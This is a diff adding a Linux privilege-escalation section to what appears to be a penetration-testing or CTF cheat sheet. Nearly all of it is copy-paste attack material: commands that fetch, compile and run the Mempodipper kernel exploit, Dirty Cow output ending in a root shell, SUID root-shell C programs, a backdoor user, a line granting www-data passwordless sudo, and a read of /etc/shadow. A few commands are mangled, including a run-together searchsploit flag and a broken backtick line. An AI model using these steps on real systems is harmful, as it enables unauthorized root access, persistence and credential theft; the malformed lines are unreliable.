@@ -35,3 +35,97 @@ Find all the strings in a file
 
 Determine the type of a file
     # file &lt;filename&gt;
+ 
+Try the obvious - Maybe the user can sudo to root:
+    # sudo su
+
+Highon.coffee Linux Local Enum wget https://highon.coffee/downloads/linux-local-enum.sh
+
+Basic Linux Privilege Escalation
+    https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Linux Privilege Exploit Suggester
+    https://github.com/PenturaLabs/Linux_Exploit_Suggester
+
+Linux post exploitation enumeration and exploit checking tools
+    https://github.com/reider-roque/linpostexp
+
+CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+    https://www.exploit-db.com/exploits/15285/
+
+CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+    https://git.zx2c4.com/CVE-2012-0056/about/
+
+Linux CVE 2012-0056
+    # wget -O exploit.c http://www.exploit-db.com/download/18411
+    # gcc -o mempodipper exploit.c
+    # ./mempodipper
+
+CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+    https://dirtycow.ninja/
+    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016
+    ./cow32
+    DirtyCow root privilege escalation
+    Backing up /usr/bin/passwd.. to /tmp/bak
+    Size of binary: 45420
+    Racing, this may take a while..
+    thread stopped
+    thread stopped
+    /usr/bin/passwd is overwritten
+    Popping root shell.
+
+Run a command as a user other than root
+    # sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
+
+Add a user or change a password
+    # /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor
+    echo thePassword | passwd haxzor --stdin
+
+Local Privilege Escalation Exploit in Linux
+
+    SUID (Set owner User ID up on execution)
+    Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.
+
+    below are some quick copy and paste examples for various shells:    
+
+    SUID C Shell for /bin/bash
+
+    int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+    }
+
+SUID C Shell for /bin/sh
+    int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/sh");
+    }
+
+Building the SUID Shell binary
+    # gcc -o suid suid.c
+    For 32 bit:
+    # gcc -m32 -o suid suid.c
+
+Create and compile an SUID from a limited shell (no file transfer)
+    # echo "int main(void){\nsetgid(0); setuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c
+gcc privsc.c -o privsc
+
+Add users to Root SUDO group with no password requirement
+    # echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+
+SearchSploit
+    # searchsploit –uncsearchsploit apache 2.2
+    # searchsploit "Linux Kernel"
+    # searchsploit linux 2.6 | grep -i ubuntu | grep local
+    # Searchsploit slmail
+
+Kernel Exploit Suggestions for Kernel Version 3.0.0
+    # ./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0
+
+Precompiled Linux Kernel Exploits - Super handy if GCC is not installed on the target machine!
+https://www.kernel-exploits.com/
+
+Collect root password
+    # cat /etc/shadow |grep root
+
+Find and display the proof.txt or flag.txt - LOOT! `cat ``find / -name proof.txt -print```
